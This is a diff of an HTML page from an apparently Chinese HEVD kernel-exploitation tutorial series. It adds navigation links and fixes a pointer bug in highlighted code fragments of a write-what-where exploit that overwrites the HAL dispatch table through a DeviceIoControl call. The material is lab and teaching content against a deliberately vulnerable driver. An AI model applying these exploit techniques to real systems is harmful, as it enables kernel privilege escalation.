@@ -385,6 +385,30 @@
   </li>
 
         
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../nullpointerDereference/" title="（四）HEVD 空指针引用" class="md-nav__link">
+      （四）HEVD 空指针引用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../uninitializedStackVariable/" title="（五）HEVD 未初始化栈变量" class="md-nav__link">
+      （五）HEVD 未初始化栈变量
+    </a>
+  </li>
+
+        
       </ul>
     </nav>
   </li>
@@ -604,7 +628,7 @@
     <span class="n">HMODULE</span> <span class="n">ntkrnlpaUserBase</span><span class="p">;</span>
     <span class="n">PVOID</span> <span class="n">halDispatchTableAddress</span><span class="p">;</span>
     <span class="n">PPayload</span> <span class="n">payload</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">LPDWORD</span> <span class="n">BytesReturned</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">BytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 
     <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPayload</span><span class="p">)</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span>
         <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span>
@@ -663,7 +687,7 @@
     <span class="n">payload</span> <span class="o">-&gt;</span> <span class="n">what</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ptr</span> <span class="p">;</span>
     <span class="n">payload</span> <span class="o">-&gt;</span> <span class="n">where</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span> <span class="n">whereAddress</span><span class="p">;</span>
 
-    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x0022200B</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Payload</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">BytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x0022200B</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Payload</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
 
     <span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="s">&quot;ntdll.dll&quot;</span><span class="p">);</span>
     <span class="n">ULONG</span> <span class="n">Interval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
